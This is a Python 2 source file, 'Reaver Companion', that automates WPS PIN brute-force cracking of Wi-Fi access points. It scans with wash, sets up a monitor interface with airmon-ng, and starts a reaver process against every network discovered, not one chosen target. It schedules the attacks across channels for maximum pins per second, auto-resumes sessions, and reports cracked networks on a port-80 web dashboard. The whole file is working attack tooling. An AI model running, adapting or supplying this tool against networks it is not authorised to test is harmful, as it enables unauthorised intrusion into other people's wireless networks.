#! /usr/bin/python
import subprocess
import os
from select import select
import sys
import fcntl, os
import time
import re
import string,cgi,time
from os import curdir, sep
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import threading
from optparse import OptionParser
import traceback

VERSION = "0.1"
VERSION_STR = 'Reaver Companion v%s\nCopyright 2012, Ruby Feinstein <shoote@gmail.com>' % VERSION

REAVER_TAG = "./reaver_tag"
REAVER_CMD = "%s -i %%s -b %%s -c %%d -vv" % REAVER_TAG
WASH_CMD   = "./wash -i %s -C"

WASH_TIMEOUT = 30
SIMULATE_WASH = True

LOG_DIR = "reaver-script-logs"

DEBUG = 3
VERBOSE = 2
INFO = 1
ERROR = 0

PRINT_LEVEL = INFO
LOG_LEVEL = 100

DISABLED = LOG_LEVEL + 1

SIGCONT = 18

PAUSE_STRING = "Reaver-script: Sleep"

CHAN_MIN = 1
CHAN_MAX = 11

MAX_TIME_PER_ITER = 300

# network status consts
DEAD = 0
SUSPENDED = 1
RUNNING = 2
CRACKED = 3
PRE_RUN = -1

# reaver script states
STATE_RUNNING_WASH = 0
STATE_RUNNING_REAVER = 1
TIMESTAMP_FORMAT = "%d.%m.%y %H:%M:%S"

START_TIME_STR = time.strftime(TIMESTAMP_FORMAT)

HTTP_SERVER_LOG = "http_server.log"
HTTP_PORT = 80

class DebugClass(object):
    def __init__(self, log_filename = "reaver-script.log"):
        self.log_filename = log_filename
        self.log_run_dir = os.path.join(LOG_DIR, START_TIME_STR)    
        self.log_dir_init = False
        self.log_level = LOG_LEVEL  
        self.print_level = PRINT_LEVEL
    
    def get_log_file(self):
        filename = self.log_filename
        file_path = os.path.join(self.log_run_dir, filename)
        return file_path            
    
    def prepare_log_dir(self):
        if not(os.path.exists(self.log_run_dir)):
            os.makedirs(self.log_run_dir)    
    
    def debug(self, level, *args, **kargs):
        if not(self.log_dir_init):
            self.prepare_log_dir()
        
        buffer = "".join([str(i) for i in args])       
        
        dont_timestamp = False
        if "dont_timestamp" in kargs:
            dont_timestamp = kargs["dont_timestamp"]
        if dont_timestamp == False:
            buffer = "[%s] %s" % (time.strftime(TIMESTAMP_FORMAT),buffer)

        add_line = True
        if "add_line" in kargs:
            add_line = kargs["add_line"]
        if add_line:
            buffer = buffer + "\n"
       
        
        if level<=self.log_level:
            log_file = file(self.get_log_file(),'a')
            log_file.write(buffer)
            log_file.close()
        
        if level<=self.print_level:
            print buffer,

def generate_handler(parent):
    main_template = file(r'main.html','r').read()
    class TinyHandler(DebugClass, BaseHTTPRequestHandler):
        def __init__(self, request, client_address, server):
            DebugClass.__init__(self, log_filename=HTTP_SERVER_LOG)
            BaseHTTPRequestHandler.__init__(self, request, client_address, server)
    
        def log_message(self, format, *args):
            pass    
    
        def _gen_networks_table(self):
            networks = parent.get_all_networks()
            result = ""
            # chan, status, last iter duration, pin count, rssi, bssid, essid, kill
            template = """
    <tr>
        <td>%d</td>
        <td><a href="/log/%s">%s</a></td> 
        <td>%d</td> 
        <td>%d</td>    
        <td>%0.2f</td>
        <td>%s</td>    
        <td>%s</td>        
        <td><a href="/kill/?/%s">x</a></td>   
    </tr>"""

            for n in networks:
                result += template % (n.channel,
                                      n.bssid,
                                      n.status_str(),
                                      n.get_last_iter_duration(),
                                      n.pin_count,
                                      n.rssi,
                                      n.bssid,
                                      n.essid,
                                      n.bssid)
                
            return result
        
        def _gen_groups_table(self):
            groups = parent.groups
            result = ""
            # chan, priority, target run time, real run time, speed
            template = """
    <tr>
        <td>%d</td>
        <td>%d</td> 
        <td>%d</td> 
        <td>%d</td>    
        <td>%0.2f</td>
    </tr>"""

            for g in groups:
                if len(g.networks) == 0:
                    continue
                result += template % (g.channel,
                                      g.priority,
                                      g.wanted,
                                      g.total_run_time,
                                      g.get_speed())
                
            return result		
    
        
        def get_version_html(self):
            buffer = ""
            for line in VERSION_STR.splitlines():
                buffer += "<h2>%s</h2>" % line.replace("<", "&lt;").replace(">","&gt;")
            return buffer
            
        def handle_main(self):
            self.debug(VERBOSE, "handle_main")
            self.send_response(200)
            self.send_header('Content-type',	'text/html')
            self.end_headers()
            response = main_template
            response = response.replace("[version_str]", self.get_version_html())
            response = response.replace("[start_time]", time.strftime(TIMESTAMP_FORMAT, time.localtime(parent.start_time)))
            response = response.replace("[total_number_of_pins]", str(parent.total_number_of_pins) )
            response = response.replace("[seconds_per_pin]", "%0.1f" % parent.get_seconds_per_pin() ) 
            response = response.replace("[networks]", self._gen_networks_table() )
            response = response.replace("[groups]", self._gen_groups_table() )
            self.wfile.write(response)
            return
            
        def handle_get_log(self, bssid):
            self.debug(VERBOSE, "serving logs for %s" % bssid)
            f = self.find_log_for_bssid(bssid)
            self.send_response(200)
            self.send_header('Content-type','text')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()        
        
        def handle_get_main_log(self):
            self.debug(VERBOSE, "serving main log")
            self.send_response(200)
            self.send_header('Content-type','text')
            self.end_headers()
            f = file(parent.get_log_file(),'r')
            self.wfile.write(f.read())
            f.close()         
        
        def handle_kill(self, bssid):
            n = self.find_network_for_bssid(bssid)
            if n.status in [RUNNING, SUSPENDED]:
                parent.debug(INFO, "killing process %d (http server command)" % n.p.pid)
                n.p.terminate()
            self.send_response(200)
            self.send_header('Content-type','text/html')
            f = file('redirect.html','r')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()            
        
        def handle_wash(self):
            self.send_response(200)
            self.send_header('Content-type','text/html')
            f = file('running_wash.html','r')
            buffer = f.read()
            f.close()
            wash_html = parent.wash_data.replace("\n","<br>").replace(" ","&nbsp")
            buffer = buffer.replace("[wash_log]", wash_html)
            self.end_headers()
            self.wfile.write(buffer)
                     
        
        def find_network_for_bssid(self, bssid):
            networks = parent.get_all_networks()
            for n in networks:
                if n.bssid == bssid:
                    return n
            raise Exception("find_network_for_bssid failed")
            
        def find_log_for_bssid(self,bssid):
            n = self.find_network_for_bssid(bssid)
            return file(n.get_log_file(),'r')
        
        def do_GET(self):
            try:
                self.debug(VERBOSE, "http path: %s" % self.path) 
                
                if parent.state == STATE_RUNNING_WASH:
                    self.handle_wash()
                    return
                
                if parent.state == STATE_RUNNING_REAVER:
                    if self.path in ["/"]:
                        self.handle_main()
                        return
                    
                    if self.path == "/full_log/":
                        self.handle_get_main_log()
                        return
                    
                    if self.path.find("/log/")!=-1:
                        bssid = self.path.split("/")[-1]
                        self.handle_get_log(bssid)
                        return
                    
                    if self.path.find("/kill/")!=-1:
                        bssid = self.path.split("/")[-1]
                        self.handle_kill(bssid)
                        return                                   
                
                self.send_error(404,'Invalid request: %s' % self.path)
                    
            except IOError:
                self.send_error(404,'File Not Found: %s' % self.path)
    
    return TinyHandler
class TinyHttpServer(DebugClass, threading.Thread):
    def __init__(self, parent):
        self.parent = parent
        threading.Thread.__init__(self)
        DebugClass.__init__(self, log_filename=HTTP_SERVER_LOG)
        self.server = None
    
    def shutdown(self):
        if self.server:
            self.debug(INFO,'closing httpserver...')
            self.server.shutdown()
            self.server.socket.close()
    
    def run(self):
        try:
            self.server = HTTPServer(('', HTTP_PORT), generate_handler(self.parent) )
            self.debug(INFO,'started httpserver...')
            self.server.serve_forever()
        except KeyboardInterrupt:
            self.parent.debug(ERROR, '^C received, shutting down server')
        finally:
            if self.server:
                self.server.socket.close()

class Watchdog(DebugClass, threading.Thread):
    def __init__(self, parent):
        self.parent = parent
        threading.Thread.__init__(self)
        self.should_stop = False
        DebugClass.__init__(self)
        self.debug(DEBUG, "Watchdog init")        
 
    def shutdown(self):
        self.should_stop = True
    
    def run(self):
        while not(self.should_stop):
            for n in self.parent.get_all_running_networks():
                if n.get_last_iter_duration() > MAX_TIME_PER_ITER:
                    n.debug(ERROR, "REAVER_SCRIPT: iter_timeout, killing %s" % n)
                    n.p.terminate()
            time.sleep(1)
            
class ReaverScript(DebugClass):
    def __init__(self, interface="mon0"):
        DebugClass.__init__(self)
        self.print_level = INFO
        self.debug(INFO, VERSION_STR + "\n", dont_timestamp = True)
        self.total_number_of_pins = 0
        self.groups = []
        self.interface = interface    
        self.state = None
        self.wash_data = ""
        self.last_super_suspend = 0
        self.last_super_suspend_timeout = 1
        self.server = None
        self.watchdog = None
        self.sanity()
        self.min_run_time = 0
        
    def sanity(self):
        if not os.geteuid() == 0:
            message = "sanity: reaver-script must run as root"
            self.debug(ERROR, message)                
            raise Exception(message)
        if self.check_mon_interface() == False:
            self.debug(INFO, "trying to create mon0 interface using airmon-ng")
            self.create_mon_interface()
            if self.check_mon_interface() == False:
                message = "sanity: failed creating mon0, try using airmon-ng manually"
                self.debug(ERROR, message)                
                raise Exception(message)
        wash = WashWrapper(self)
        wash.sanity()
        self.check_reaver_tag()
    
    
    def get_state_str(self):
        if self.state == None:
            return "NONE"
        elif self.state == STATE_RUNNING_WASH:
            return "running wash"
        elif self.state == STATE_RUNNING_REAVER:
            return "running reaver"
    
    def create_mon_interface(self):
        try:
            subprocess.check_call("airmon-ng start wlan0", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
        except subprocess.CalledProcessError, e:
            message = "create_mon_interface: failed creating mon0"
            self.debug(INFO, message)
            return False
        return True
    
    def check_reaver_tag(self):
        try:
            command = "%s --help" % REAVER_TAG
            retcode = subprocess.call(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)   
            if retcode != 1:
                raise subprocess.CalledProcessError(retcode, command)
        except subprocess.CalledProcessError, e:
            message = "SANITY CHECK ERROR: failed running reaver_tag" % self.interface
            self.debug(ERROR, message)
            raise e 
    
    def check_mon_interface(self):
        try:
            subprocess.check_call("iwconfig %s" % self.interface, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
        except subprocess.CalledProcessError, e:
            message = "SANITY CHECK ERROR: you should first use airmon-ng to create %s interface" % self.interface
            self.debug(INFO, message)
            return False
        return True
        
    def switch_channel(self, n):
        self.debug(VERBOSE, "switching to channel %d." % n)
        subprocess.check_call("iwconfig %s channel %d" % (self.interface, n), shell=True)        
        
    def get_all_networks(self):
        networks = []
        for g in self.groups:
            networks += g.networks
        return networks    
    
    def count_living_networks(self):
        networks = self.get_all_networks()
        count = 0
        for n in networks:
            if n.status in [RUNNING, SUSPENDED, PRE_RUN]:
                count += 1
        return count
    
    def get_all_running_networks(self):
        networks = self.get_all_networks()
        return filter(lambda x: x.status == RUNNING, networks)
    
    def get_seconds_per_pin(self):
        if self.total_number_of_pins == 0:
            return -1
            
        total_time = time.time() - self.start_time
        return total_time/float(self.total_number_of_pins)
        
    def run(self):
        try:
            self.start_time = time.time()
            self.server = TinyHttpServer(self)
            self.server.start()            
            
            buffer = ""
            if SIMULATE_WASH:
                buffer = file(r'wash_test.txt','rb').read() 
            else:
                wash = WashWrapper(self)
                buffer = wash.run()
            
            self.groups = self.parse_wash(buffer)
            self.scheduler = Scheduler(self.groups, self)
            
            self.watchdog = Watchdog(self)
            self.watchdog.start()            
            
            self.state = STATE_RUNNING_REAVER
            
            iter_num = 0
            active_channels = 0
            for i in self.groups:
                if len(i.networks) > 0:
                    active_channels += 1
                self.debug(VERBOSE, repr(i))
            while self.count_living_networks() != 0:
                iter_num += 1
                count = 0
                total_time = time.time() - self.start_time

                if iter_num == 3:
                    # Todo: fix const
                    self.debug(VERBOSE, "setting min_run_time")
                    self.min_run_time = 90
                
                if self.total_number_of_pins !=0:
                    self.debug(INFO, "STATS: tested %d pins, %0.1f sec/pin" % 
                         (self.total_number_of_pins, self.get_seconds_per_pin() ) )                
                
                for i in xrange(active_channels):
                    self.debug(INFO, "self.scheduler.get_next_group()")
                    g = self.scheduler.get_next_group()
                    run_count = g.run_loop()
                    if run_count == 0:
                        self.debug(INFO, "added penalty sleep to channel %d" % g.channel)
                        min_sleep = g.get_min_sleep()
                        g.total_run_time += min_sleep
                    count += run_count
                    self.debug(VERBOSE, repr(g))  
                
                self.scheduler.update_priority()
                
                if count == 0:
                    timeout = self.get_smart_suspend_time()
                    self.debug(INFO, "all the networks are suspended, sleeping for %d seconds" % timeout)
                    time.sleep(timeout)
                
                
                
            self.debug(INFO, "we finished here (count_living_networks == 0)")
            
        except KeyboardInterrupt:
            self.debug(ERROR, '^C received, shutting down.')
        finally:
            print "finally..."
            if self.server:
                self.server.shutdown()
            if self.watchdog:
                self.watchdog.shutdown()

    def get_smart_suspend_time(self):
        last = self.last_super_suspend
        if time.time() - last > self.last_super_suspend_timeout:
            return 1
        else:
            self.last_super_suspend_timeout *= 2
            self.last_super_suspend = time.time()
            return self.last_super_suspend_timeout
            
    def parse_wash(self,buffer):
        lines = buffer.splitlines()
        first_line = -1
        for i in xrange(len(lines)):
            if lines[i].find("BSSID")!=-1:
                first_line = i+2
                break

        networks = [Network(i, self) for i in lines[first_line:]]
        groups = [Group(i, self) for i in xrange(CHAN_MIN,CHAN_MAX+1)]
        for n in networks:
            self.debug(VERBOSE,"adding %s to group %d" % (n, n.channel-1))
            groups[n.channel-1].add(n)
        return groups
        
class WashWrapper(DebugClass):
    def __init__(self, parent):
        self.parent = parent
        DebugClass.__init__(self, log_filename = "wash.log")
    
    def sanity(self):
        try:
            command = WASH_CMD % self.parent.interface
            command += " --help"
            retcode = subprocess.call(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
            if retcode != 1:
                raise subprocess.CalledProcessError(retcode, command)
        except subprocess.CalledProcessError, e:
            message = "SANITY CHECK ERROR: failed running wash"
            self.debug(ERROR, message)
            raise e        
    
    def run(self):
        self.parent.state = STATE_RUNNING_WASH
        self.parent.debug(INFO,"Running 'wash' for %d seconds" % WASH_TIMEOUT)
        start_time = time.time()
        p = my_popen(WASH_CMD % (self.parent.interface) )
        data = ""
        while (time.time() - start_time < WASH_TIMEOUT) and p.poll()==None:
            r_list, w_list, x_list = select([p.stdout, p.stderr], [], [], 0.5)
            for i in r_list:
                buffer = i.read()
                if len(buffer)>0:
                    self.debug(INFO, buffer, add_line = False)
                data += buffer
                self.parent.wash_data = data
        if p.poll()!=None:
            self.parent.debug(ERROR, "wash finished ahead of time")
            raise Exception("wash finished ahead of time")
        p.terminate()
        #todo check return codeash 
        self.parent.debug(INFO,"Wash ended nicely")
        return data           

class Scheduler(DebugClass):
    def __init__(self, groups, parent):
        self.parent = parent
        self.groups = groups
        DebugClass.__init__(self)
    
    def update_priority(self):
        self.debug(VERBOSE, "update_priority: started")
        speeds = []
        for g in self.groups:
            speed = 0
            if g.total_run_time !=0:
                speed = float(g.number_of_pins) / g.total_run_time
            speeds.append(speed)
            g.speed = speed
        speeds.sort()
        self.debug(VERBOSE, "update_priority: speeds - %s" % repr(speeds))
        
        counter = 0
        for i in xrange(len(speeds)):
            for g in self.groups:
                if g.count_living_networks() == 0:
                    g.priority = 0
                elif g.speed == speeds[i]:
                    counter += 1
                    g.priority = counter
                    self.debug(VERBOSE, "update_priority: set channel %d priority to %d" % (g.channel, g.priority))
                    g.speed = None
                    break

    def get_priority_sum(self):
        priority_sum = 0
        for g in self.groups:
            if g.count_living_networks()==0:
                g.priority = 0
                self.debug(VERBOSE, "zero channel %d priority" % g.channel)
            else:
                priority_sum += g.priority
        return priority_sum
        
    def get_next_group(self):
        total_time = 0
        for g in self.groups:
            total_time += g.total_run_time
        priority_sum = self.get_priority_sum()
        if priority_sum == 0:
            raise Exception("No more networks to crack")
        timeslot = total_time / priority_sum
        self.debug(VERBOSE, "self.get_priority_sum() = %d" % priority_sum)
        self.debug(VERBOSE, "timeslot: %0.2f" % timeslot)
        max_diff = -1000
        max_group = None
        for g in self.groups:
            if g.priority != 0:
                g.wanted = timeslot * g.priority
                g.diff = g.wanted - g.total_run_time
                if max_diff < g.diff:
                    max_diff = g.diff
                    max_group = g
        return max_group
       
class Group(DebugClass):
    def __init__(self, channel, parent, networks=None):
        self.parent = parent
        if networks==None:
            networks = []
        self.channel = channel
        self.networks = networks
        self.last_iter_time = 0
        self.iter_count = 0
        self.avg_iter_time = 0
        self.total_run_time = 0
        self.number_of_pins = 0
        self.priority = 1
        self.wanted = 0
        DebugClass.__init__(self)
    
    def get_speed(self):
        if self.total_run_time != 0:
            return float(self.number_of_pins) / self.total_run_time
        else:
            return 0
    
    def count_living_networks(self):
        count = 0
        for n in self.networks:
            if n.status in [RUNNING, SUSPENDED, PRE_RUN]:
                count += 1
        return count
    
    def get_min_sleep(self):
        m = 0
        for n in self.networks:
            m = min(n.min_sleep_time, m)
        return max(m,2)
    
    def add(self,n):
        self.networks.append(n)
    
    def count(self):
        return len(self.networks)
    
    def __repr__(self):
        buffer = "Group: \n"
        buffer += "\tchannel : %d\n" % self.channel
        buffer += "\titer_count : %d\t" % self.iter_count
        buffer += "avg_iter_time : %d\n" % self.avg_iter_time
        for i in xrange(len(self.networks)):
            n = self.networks[i]
            buffer += "\t%d) %s\t%s\t%d\t%s\t%d\t%s\n" % (i,
                                                     n.status_str(),
                                                     n.current_pin,
                                                     n.pin_count,
                                                     n.bssid,
                                                     n.last_iter_duration,
                                                     n.essid)
        return buffer
    
    def run_loop(self):
        self.debug(VERBOSE, "run_loop for channel %s" % self.channel)
        self.parent.switch_channel(self.channel)
        count = self.run()
        if count >= 0:
            self.select_loop()
        return count
    
    def get_running_max_last_iter(self):
        m = 0
        for n in self.networks:
            if n.status in [RUNNING]:
                m = max(m, n.last_iter_duration)
        return m
    
    def select_loop(self):
        self.last_iter_time = 0
        self.iter_count +=1
        reverse_dict = {}

        r_wait_list = []
        for n in self.networks:
            reverse_dict[n.p.stdout] = n
            reverse_dict[n.p.stderr] = n          
            if n.p!=None and n.p.poll()!=None:
                n.status = DEAD
            if n.status == RUNNING:
                r_wait_list.append(n.p.stdout)
                r_wait_list.append(n.p.stderr)           
        
        start_time = time.time()
        while len(r_wait_list):
            r_wait_list = []
            for n in self.networks:
                if n.status==SUSPENDED and time.time() - n.suspend_time > n.min_sleep_time:
                    duration = time.time() - start_time
                    if n.last_iter_duration + duration < max(self.get_running_max_last_iter(), self.parent.min_run_time):
                        # guess we can run one more time
                        self.debug(VERBOSE, "giving %s one more timeslot" % n)
                        n.p.send_signal(SIGCONT)
                        n.set_status_running()
                    
                if n.status==RUNNING and n.p.poll()!=None:
                    n.status = DEAD
                    n.last_iter_duration = time.time() - n.start_time
                    
                if n.status == RUNNING:
                    r_wait_list.append(n.p.stdout)
                    r_wait_list.append(n.p.stderr)        
            r_ready, w_ready, x_ready = select(r_wait_list, [], [], 0.5)
            if len(r_ready)==0:
                self.debug(DISABLED,"select_loop: len(r_ready)==0") 
            for f in r_ready:
                buffer = f.read()
                n = reverse_dict[f]
                for line in buffer.splitlines():
                    n.debug(VERBOSE, line)
                    # Check for PAUSE_STRING
                    if line.find(PAUSE_STRING)!=-1:
                        self.debug(VERBOSE, "detected pause on %s" % n)
                        r_wait_list.remove(n.p.stdout)
                        r_wait_list.remove(n.p.stderr)
                        n.status = SUSPENDED
                        n.last_iter_duration = time.time() - n.start_time
                        n.suspend_time = time.time()
                        n.total_run_time += n.last_iter_duration
                        n.min_sleep_time = int(line.split(" ")[-1])
                    if line.find("Trying pin")!=-1:
                        new_pin = line.split(" ")[-1]
                        if new_pin != n.current_pin:
                            n.current_pin = new_pin
                            n.pin_count += 1
                            self.parent.total_number_of_pins += 1
                            self.number_of_pins += 1
                    if line.find("Restore previous session for")!=-1:
                        self.debug(INFO,"auto restore previous session for %s" % n)
                        n.p.stdin.write("Y\n")
                        n.p.stdin.flush()
                    if line.find("Pin cracked in")!=-1:
                        self.debug(INFO, "cracked pin for %s" % n)
                        n.status = CRACKED
                        
        self.last_iter_time = time.time() - start_time     
        self.total_run_time += self.last_iter_time
        self.avg_iter_time = self.total_run_time / self.iter_count
        
        self.debug(VERBOSE, "channel %d suspended" % self.channel)
        
    def run(self):
        count = 0
        for n in self.networks:
            if time.time() - n.suspend_time < n.min_sleep_time:
                self.debug(VERBOSE, "time.time() - n.suspend_time < n.min_sleep_time")
                continue
            if n.status == PRE_RUN:
                self.debug(INFO, "Starting reaver on network %s" % n)
                n.p = my_popen(n.get_command())
                n.set_status_running()
                count += 1
            elif (n.status != CRACKED) and (n.p.poll()==None):
                n.p.send_signal(SIGCONT)
                n.set_status_running()
                count += 1 
            elif n.status != CRACKED:
                n.status = DEAD
            else:
                Exception("Invalid mode for network %s" % n)

        return count
class Network(DebugClass):
    def __init__(self,line, parent):
        self.parent = parent
        
        m = re.search(r'((?:(?:[A-F0-9]{2}):){5}[A-F0-9]{2}).+?([0-9]).+?(-*[0-9]+).+?([0-9]\.[0-9]).+?((?:Yes)|(?:No)).+?(\w+)', line)
        self.bssid, self.channel, self.rssi, self.version, self.locked, self.essid =  m.groups()
        self.channel = int(self.channel)
        self.rssi = int(self.rssi)
        
        self.status = PRE_RUN
        self.start_time = -1
        self.current_pin = "?"*8
        self.last_iter_duration = -1
        self.suspend_time = -1
        self.min_sleep_time = 0
        self.total_run_time = 0
        self.iter_count = 0
        if self.locked == "Yes":
            self.locked = True
        else:
            self.locked = False
        self.version = float(self.version)
        self.pin_count = 0
        self.p = None
        
        DebugClass.__init__(self)   
        self.log_filename = "%d - %s - %s" % (self.channel, self.bssid, self.essid)
        
    
    def set_status_running(self):
        self.status = RUNNING
        self.iter_count += 1    
        self.start_time = time.time()
    
    def get_last_iter_duration(self):
        if self.status == RUNNING:
            return time.time() - self.start_time
        else:
            return self.last_iter_duration
    
    def status_str(self):
        if self.status == DEAD:
            return "dead"
        elif self.status == RUNNING:
            return "running"
        elif self.status == SUSPENDED:
            return "suspended"
        elif self.status == PRE_RUN:
            return "pre_run"  
        elif self.status == CRACKED:
            return "cracked"
    
    def __str__(self):
        return "%s(%d)" % (self.essid, self.channel)

    def get_command(self):
        return REAVER_CMD % (self.parent.interface, self.bssid, self.channel)
        
    def __del__(self):
        if self.p != None and self.p.poll() == None:
            self.debug(VERBOSE, "cleaning %s" % self)
            self.p.kill()
   
def my_popen(command):
    p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=1)
    fcntl.fcntl(p.stdout.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    fcntl.fcntl(p.stderr.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
    return p

def main():
    global PRINT_LEVEL
    global MAX_TIME_PER_ITER
    global HTTP_PORT
    
    parser = OptionParser(usage=VERSION_STR)
    parser.add_option("-i", "--interface", dest="interface",
                      help="interface to capture packets on", default="mon0", action="store")
    parser.add_option("-v", "--stdout_verbose", dest="verbose",
                      help="sets the verbosity level printed to stdout", default=PRINT_LEVEL, action="store")
    parser.add_option("-t", "--iter_timeout", dest="iter_timeout",
                      help="sets the max iteration time (per reaver instance)", default=MAX_TIME_PER_ITER, action="store")
    parser.add_option("-p", "--port", dest="port",
                      help="http server port", default=HTTP_PORT, action="store")    
    
    (options, args) = parser.parse_args()
    

    PRINT_LEVEL = int(options.verbose)
    MAX_TIME_PER_ITER = int(options.iter_timeout)
    HTTP_PORT = int(options.port)
    interface = options.interface
    r = ReaverScript(interface = interface)
    try:
        r.run()
    except Exception,e:
        exc_type, exc_value, exc_traceback = sys.exc_info()
        r.debug(ERROR,"exception occured:\n%s" % traceback.format_exc())
        raise e
    
if __name__ == '__main__':
    main()
